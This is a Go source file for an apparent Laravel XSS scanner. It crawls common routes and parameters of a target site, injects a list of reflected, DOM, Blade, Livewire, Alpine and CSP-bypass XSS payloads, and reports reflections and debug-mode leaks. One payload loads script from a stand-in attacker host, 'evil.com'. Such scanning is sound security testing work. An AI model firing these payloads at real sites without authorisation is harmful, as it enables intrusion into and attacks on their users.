package vulnerabilities

import (
	"fmt"
	"io/ioutil"
	"laravelmap/internal/common"
	"laravelmap/pkg/httpclient"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// LaravelXSSScanner is a struct that contains an HTTP client for detecting XSS vulnerabilities in Laravel applications
type LaravelXSSScanner struct {
	client *httpclient.Client
}

// NewXSSScanner initializes and returns a new LaravelXSSScanner instance
func NewXSSScanner() *LaravelXSSScanner {
	return &LaravelXSSScanner{
		client: httpclient.NewClient(15 * time.Second),
	}
}

// Run checks for XSS vulnerabilities in Laravel applications
func (xs *LaravelXSSScanner) Run(target string) []common.ScanResult {
	var results []common.ScanResult

	// First, identify potential injection points
	injectionPoints := xs.identifyInjectionPoints(target)

	// Test each identified injection point
	for _, point := range injectionPoints {
		// Test different XSS payloads
		payloadResults := xs.testXSSPayloads(point)
		results = append(results, payloadResults...)
	}

	// Check for Laravel-specific XSS vulnerabilities
	laravelSpecificResults := xs.checkLaravelSpecificVulnerabilities(target)
	results = append(results, laravelSpecificResults...)

	// If no vulnerabilities were detected
	if len(results) == 0 {
		results = append(results, common.ScanResult{
			ScanName:    xs.Name(),
			Category:    "Vulnerabilities",
			Description: "No XSS vulnerabilities detected",
			Path:        target,
			StatusCode:  0,
			Detail:      "Target appears to be secure against tested XSS vectors",
		})
	}

	return results
}

// identifyInjectionPoints finds potential XSS injection points in the application
func (xs *LaravelXSSScanner) identifyInjectionPoints(target string) []string {
	var injectionPoints []string

	// Add the base target URL as a potential injection point
	injectionPoints = append(injectionPoints, target)

	// Common Laravel routes that might be vulnerable to XSS
	commonRoutes := []string{
		"/search",
		"/profile",
		"/user",
		"/account",
		"/settings",
		"/comments",
		"/feedback",
		"/contact",
		"/message",
		"/post",
		"/article",
		"/product",
		"/item",
		"/review",
		"/login",
		"/register",
		"/password/reset",
		"/password/email",
		"/api/user",
		"/api/profile",
		"/api/search",
		"/api/comments",
		"/api/feedback",
		"/api/contact",
	}

	// Common query parameters that might be vulnerable to XSS
	commonParams := []string{
		"q",
		"query",
		"search",
		"id",
		"name",
		"username",
		"email",
		"title",
		"description",
		"content",
		"message",
		"comment",
		"feedback",
		"text",
		"body",
		"redirect",
		"url",
		"return",
		"next",
		"target",
		"callback",
		"continue",
		"destination",
		"redir",
		"redirect_uri",
		"redirect_url",
		"return_url",
		"next_url",
		"back",
		"back_url",
		"page",
		"sort",
		"order",
		"filter",
		"category",
		"tag",
		"type",
		"view",
		"mode",
		"format",
		"style",
		"theme",
		"lang",
		"language",
		"locale",
	}

	// Parse the base URL
	baseURL, err := url.Parse(target)
	if err != nil {
		return injectionPoints
	}

	// Create injection points for common routes
	for _, route := range commonRoutes {
		routeURL, _ := url.Parse(target)
		routeURL.Path = route
		injectionPoints = append(injectionPoints, routeURL.String())

		// Add common parameters to each route
		for _, param := range commonParams[:5] { // Limit to first 5 params to avoid too many requests
			paramURL, _ := url.Parse(routeURL.String())
			q := paramURL.Query()
			q.Set(param, "test")
			paramURL.RawQuery = q.Encode()
			injectionPoints = append(injectionPoints, paramURL.String())
		}
	}

	// Extract existing parameters from the target URL and create injection points
	if baseURL.RawQuery != "" {
		q := baseURL.Query()
		for param := range q {
			// Create a specific injection point for this parameter
			paramURL, _ := url.Parse(target)
			paramQuery := paramURL.Query()
			paramQuery.Set(param, "test")
			paramURL.RawQuery = paramQuery.Encode()
			injectionPoints = append(injectionPoints, paramURL.String())
		}
	}

	return injectionPoints
}

// testXSSPayloads tests various XSS payloads against a target URL
func (xs *LaravelXSSScanner) testXSSPayloads(targetURL string) []common.ScanResult {
	var results []common.ScanResult

	// Parse the URL to extract and modify parameters
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return results
	}

	// Define XSS payloads
	payloads := []struct {
		value       string
		description string
		type_       string
	}{
		// Basic XSS payloads
		{"<script>alert(1)</script>", "Basic script tag XSS", "reflected"},
		{"<img src=x onerror=alert(1)>", "Image onerror XSS", "reflected"},
		{"<svg onload=alert(1)>", "SVG onload XSS", "reflected"},
		{"<body onload=alert(1)>", "Body onload XSS", "reflected"},
		{"<iframe src=\"javascript:alert(1)\"></iframe>", "Iframe JavaScript URL XSS", "reflected"},
		{"<a href=\"javascript:alert(1)\">click me</a>", "Anchor JavaScript URL XSS", "reflected"},
		{"<div onmouseover=\"alert(1)\">hover me</div>", "Div onmouseover XSS", "reflected"},
		{"<button onclick=\"alert(1)\">click me</button>", "Button onclick XSS", "reflected"},

		// Attribute-based XSS payloads
		{"\" onmouseover=\"alert(1)", "Quote breaking attribute XSS", "reflected"},
		{"' onmouseover='alert(1)", "Single quote breaking attribute XSS", "reflected"},
		{"\"><script>alert(1)</script>", "Quote breaking script tag XSS", "reflected"},
		{"'><script>alert(1)</script>", "Single quote breaking script tag XSS", "reflected"},
		{"\"><img src=x onerror=alert(1)>", "Quote breaking image onerror XSS", "reflected"},
		{"'><img src=x onerror=alert(1)>", "Single quote breaking image onerror XSS", "reflected"},

		// JavaScript context XSS payloads
		{"\"-alert(1)-\"", "JavaScript string breaking XSS", "reflected"},
		{"'-alert(1)-'", "JavaScript single quote string breaking XSS", "reflected"},
		{"</script><script>alert(1)</script>", "Script tag closing XSS", "reflected"},

		// Encoded XSS payloads
		{"%3Cscript%3Ealert(1)%3C/script%3E", "URL encoded script tag XSS", "reflected"},
		{"%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "URL encoded image onerror XSS", "reflected"},
		{"&lt;script&gt;alert(1)&lt;/script&gt;", "HTML entity encoded script tag XSS", "reflected"},

		// DOM-based XSS payloads
		{"#<script>alert(1)</script>", "Hash-based DOM XSS", "dom"},
		{"#<img src=x onerror=alert(1)>", "Hash-based DOM image XSS", "dom"},

		// Laravel-specific XSS payloads
		{"{{alert(1)}}", "Laravel Blade expression XSS", "blade"},
		{"{!!alert(1)!!}", "Laravel Blade unescaped expression XSS", "blade"},
		{"@{{alert(1)}}", "Laravel Blade raw expression XSS", "blade"},
		{"{{-- alert(1) --}}", "Laravel Blade comment XSS", "blade"},
		{"@php echo '<script>alert(1)</script>'; @endphp", "Laravel Blade PHP directive XSS", "blade"},

		// CSP bypass XSS payloads
		{"<script src=\"data:text/javascript,alert(1)\"></script>", "Data URI script XSS", "csp-bypass"},
		{"<script src=\"//evil.com/xss.js\"></script>", "Protocol-relative URL XSS", "csp-bypass"},
		{"<object data=\"javascript:alert(1)\"></object>", "Object data JavaScript URL XSS", "csp-bypass"},
		{"<link rel=\"import\" href=\"javascript:alert(1)\">", "Link import JavaScript URL XSS", "csp-bypass"},
		{"<base href=\"javascript:alert(1)//\">", "Base href JavaScript URL XSS", "csp-bypass"},

		// Event handler XSS payloads
		{"<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "SVG animate onbegin XSS", "event-handler"},
		{"<marquee onstart=alert(1)>", "Marquee onstart XSS", "event-handler"},
		{"<details ontoggle=alert(1) open>", "Details ontoggle XSS", "event-handler"},
		{"<select autofocus onfocus=alert(1)>", "Select onfocus XSS", "event-handler"},
		{"<input autofocus onfocus=alert(1)>", "Input onfocus XSS", "event-handler"},
		{"<keygen autofocus onfocus=alert(1)>", "Keygen onfocus XSS", "event-handler"},
		{"<video autoplay onloadeddata=alert(1)><source src=\"x\" type=\"video/mp4\"></video>", "Video onloadeddata XSS", "event-handler"},
		{"<audio autoplay onloadeddata=alert(1)><source src=\"x\" type=\"audio/mp3\"></audio>", "Audio onloadeddata XSS", "event-handler"},

		// Laravel-specific Livewire XSS payloads
		{"<div wire:click=\"alert(1)\">", "Livewire wire:click XSS", "livewire"},
		{"<div wire:model=\"javascript:alert(1)\">", "Livewire wire:model XSS", "livewire"},
		{"<div wire:init=\"alert(1)\">", "Livewire wire:init XSS", "livewire"},
		{"<div x-data=\"{foo: () => { alert(1) }}\" x-init=\"foo()\">", "Alpine.js x-data/x-init XSS", "alpine"},
		{"<div x-on:click=\"alert(1)\">", "Alpine.js x-on:click XSS", "alpine"},
	}

	// Test each parameter in the URL with each payload
	q := parsedURL.Query()
	if len(q) > 0 {
		// Test each parameter
		for param := range q {
			originalValue := q.Get(param)

			// Test each payload (limit to first 10 to avoid too many requests)
			for _, payload := range payloads[:10] {
				// Create a new query with the payload
				testQuery := parsedURL.Query()
				testQuery.Set(param, payload.value)

				// Create the test URL
				testURL := *parsedURL
				testURL.RawQuery = testQuery.Encode()

				// Send the request
				headers := map[string]string{
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				}

				resp, err := xs.client.Get(testURL.String(), headers)
				if err != nil {
					continue
				}

				// Read the response body
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyString := string(bodyBytes)

				// Check if the payload is reflected in the response
				// We need to check for both encoded and decoded versions
				if strings.Contains(bodyString, payload.value) ||
					strings.Contains(bodyString, url.QueryEscape(payload.value)) {
					results = append(results, common.ScanResult{
						ScanName:    xs.Name(),
						Category:    "Vulnerabilities",
						Description: "Potential XSS vulnerability detected",
						Path:        testURL.String(),
						StatusCode:  resp.StatusCode,
						Detail:      fmt.Sprintf("Parameter: %s, Payload: %s, Type: %s, Description: %s", param, payload.value, payload.type_, payload.description),
					})
				}
			}

			// Restore the original value
			q.Set(param, originalValue)
		}
	} else {
		// If no parameters exist, try to add some common ones
		commonParams := []string{"q", "search", "query", "id", "name", "redirect"}

		for _, param := range commonParams[:3] { // Limit to first 3 to avoid too many requests
			for _, payload := range payloads[:5] { // Limit to first 5 payloads
				// Create a new query with the payload
				testQuery := url.Values{}
				testQuery.Set(param, payload.value)

				// Create the test URL
				testURL := *parsedURL
				testURL.RawQuery = testQuery.Encode()

				// Send the request
				headers := map[string]string{
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				}

				resp, err := xs.client.Get(testURL.String(), headers)
				if err != nil {
					continue
				}

				// Read the response body
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyString := string(bodyBytes)

				// Check if the payload is reflected in the response
				if strings.Contains(bodyString, payload.value) ||
					strings.Contains(bodyString, url.QueryEscape(payload.value)) {
					results = append(results, common.ScanResult{
						ScanName:    xs.Name(),
						Category:    "Vulnerabilities",
						Description: "Potential XSS vulnerability detected",
						Path:        testURL.String(),
						StatusCode:  resp.StatusCode,
						Detail:      fmt.Sprintf("Parameter: %s, Payload: %s, Type: %s, Description: %s", param, payload.value, payload.type_, payload.description),
					})
				}
			}
		}
	}

	return results
}

// checkLaravelSpecificVulnerabilities checks for Laravel-specific XSS vulnerabilities
func (xs *LaravelXSSScanner) checkLaravelSpecificVulnerabilities(target string) []common.ScanResult {
	var results []common.ScanResult

	// Check for Laravel CSRF token in meta tag (indicates Laravel frontend)
	resp, err := xs.client.Get(target, nil)
	if err != nil {
		return results
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return results
	}
	bodyString := string(bodyBytes)

	// Check for Laravel CSRF token meta tag
	csrfTokenPattern := `<meta name="csrf-token" content="[^"]+"`
	csrfTokenRegex := regexp.MustCompile(csrfTokenPattern)
	if csrfTokenRegex.MatchString(bodyString) {
		// Laravel frontend detected, check for specific vulnerabilities

		// Check for Laravel Blade unescaped output
		unescapedOutputPattern := `{!!.*!!}`
		unescapedOutputRegex := regexp.MustCompile(unescapedOutputPattern)
		if unescapedOutputRegex.MatchString(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    xs.Name(),
				Category:    "Vulnerabilities",
				Description: "Potential XSS vulnerability detected in Laravel Blade template",
				Path:        target,
				StatusCode:  resp.StatusCode,
				Detail:      "Unescaped Blade output ({!! ... !!}) detected. This can lead to XSS if user input is rendered without proper sanitization.",
			})
		}

		// Check for Laravel Blade raw directive
		rawDirectivePattern := `@php\s+echo`
		rawDirectiveRegex := regexp.MustCompile(rawDirectivePattern)
		if rawDirectiveRegex.MatchString(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    xs.Name(),
				Category:    "Vulnerabilities",
				Description: "Potential XSS vulnerability detected in Laravel Blade template",
				Path:        target,
				StatusCode:  resp.StatusCode,
				Detail:      "@php echo directive detected. This can lead to XSS if user input is echoed without proper sanitization.",
			})
		}

		// Check for Laravel old input helper
		oldInputPattern := `old\(['"](.*?)['"]`
		oldInputRegex := regexp.MustCompile(oldInputPattern)
		if oldInputRegex.MatchString(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    xs.Name(),
				Category:    "Vulnerabilities",
				Description: "Potential XSS vulnerability detected in Laravel Blade template",
				Path:        target,
				StatusCode:  resp.StatusCode,
				Detail:      "old() helper function detected. This can lead to XSS if used with unescaped output and user input is not properly sanitized.",
			})
		}

		// Check for Laravel request input
		requestInputPattern := `request\(\)->(get|input|query)\(['"](.*?)['"]`
		requestInputRegex := regexp.MustCompile(requestInputPattern)
		if requestInputRegex.MatchString(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    xs.Name(),
				Category:    "Vulnerabilities",
				Description: "Potential XSS vulnerability detected in Laravel Blade template",
				Path:        target,
				StatusCode:  resp.StatusCode,
				Detail:      "request()->input() method detected. This can lead to XSS if used with unescaped output and user input is not properly sanitized.",
			})
		}

		// Check for Laravel Livewire components
		livewirePattern := `wire:`
		if strings.Contains(bodyString, livewirePattern) {
			results = append(results, common.ScanResult{
				ScanName:    xs.Name(),
				Category:    "Vulnerabilities",
				Description: "Laravel Livewire detected - potential XSS vector",
				Path:        target,
				StatusCode:  resp.StatusCode,
				Detail:      "Livewire components detected. Check for proper input sanitization in Livewire components, especially in wire:model attributes.",
			})
		}

		// Check for Alpine.js
		alpinePattern := `x-data`
		if strings.Contains(bodyString, alpinePattern) {
			results = append(results, common.ScanResult{
				ScanName:    xs.Name(),
				Category:    "Vulnerabilities",
				Description: "Alpine.js detected - potential XSS vector",
				Path:        target,
				StatusCode:  resp.StatusCode,
				Detail:      "Alpine.js detected. Check for proper input sanitization in Alpine.js expressions and event handlers.",
			})
		}
	}

	// Check for Laravel debug mode
	if strings.Contains(bodyString, "Whoops, looks like something went wrong.") {
		// Test a payload that might trigger a Laravel error
		errorURL, _ := url.Parse(target)
		q := errorURL.Query()
		q.Set("error_test", "1/0") // Division by zero to trigger error
		errorURL.RawQuery = q.Encode()

		errorResp, err := xs.client.Get(errorURL.String(), nil)
		if err == nil {
			defer errorResp.Body.Close()
			errorBodyBytes, err := ioutil.ReadAll(errorResp.Body)
			if err == nil {
				errorBodyStr := string(errorBodyBytes)

				// Check if error reveals stack trace
				if strings.Contains(errorBodyStr, "Stack trace:") ||
					strings.Contains(errorBodyStr, "Illuminate\\") ||
					strings.Contains(errorBodyStr, "vendor/laravel/framework") {
					results = append(results, common.ScanResult{
						ScanName:    xs.Name(),
						Category:    "Vulnerabilities",
						Description: "Laravel debug mode is enabled",
						Path:        errorURL.String(),
						StatusCode:  errorResp.StatusCode,
						Detail:      "Debug mode exposes sensitive information that could be used to craft XSS attacks. It should be disabled in production.",
					})
				}
			}
		}
	}

	// Check for Laravel form with unescaped old input
	formPattern := `<form[^>]*>.*?</form>`
	formRegex := regexp.MustCompile(formPattern)
	forms := formRegex.FindAllString(bodyString, -1)
	for _, form := range forms {
		// Check for value attribute with old helper
		oldValuePattern := `value=["']?{{\s*old\(['"]([^'"]+)['"][^}]*}}`
		oldValueRegex := regexp.MustCompile(oldValuePattern)
		if oldValueRegex.MatchString(form) {
			results = append(results, common.ScanResult{
				ScanName:    xs.Name(),
				Category:    "Vulnerabilities",
				Description: "Potential XSS vulnerability detected in Laravel form",
				Path:        target,
				StatusCode:  resp.StatusCode,
				Detail:      "Form contains old() helper in value attribute without proper escaping. This can lead to XSS if user input is not properly sanitized.",
			})
		}
	}

	// Test for XSS in Laravel error pages
	errorPaths := []string{"/non-existent-page", "/error", "/404", "/500"}
	for _, path := range errorPaths[:2] { // Limit to first 2 to avoid too many requests
		errorURL, _ := url.Parse(target)
		errorURL.Path = path

		errorResp, err := xs.client.Get(errorURL.String(), nil)
		if err != nil {
			continue
		}

		if errorResp.StatusCode == http.StatusNotFound || errorResp.StatusCode == http.StatusInternalServerError {
			defer errorResp.Body.Close()

			// Check if the error page reflects URL parameters
			testURL, _ := url.Parse(errorURL.String())
			q := testURL.Query()
			xssPayload := "<script>alert('xss')</script>"
			q.Set("test", xssPayload)
			testURL.RawQuery = q.Encode()

			testResp, err := xs.client.Get(testURL.String(), nil)
			if err != nil {
				continue
			}
			defer testResp.Body.Close()
			testBodyBytes, err := ioutil.ReadAll(testResp.Body)
			if err != nil {
				continue
			}
			testBodyString := string(testBodyBytes)

			if strings.Contains(testBodyString, xssPayload) {
				results = append(results, common.ScanResult{
					ScanName:    xs.Name(),
					Category:    "Vulnerabilities",
					Description: "XSS vulnerability detected in Laravel error page",
					Path:        testURL.String(),
					StatusCode:  testResp.StatusCode,
					Detail:      fmt.Sprintf("Error page at %s reflects XSS payload without proper escaping.", path),
				})
			}
		}
	}

	return results
}

func (xs *LaravelXSSScanner) Name() string {
	return "Laravel XSS Scanner"
}
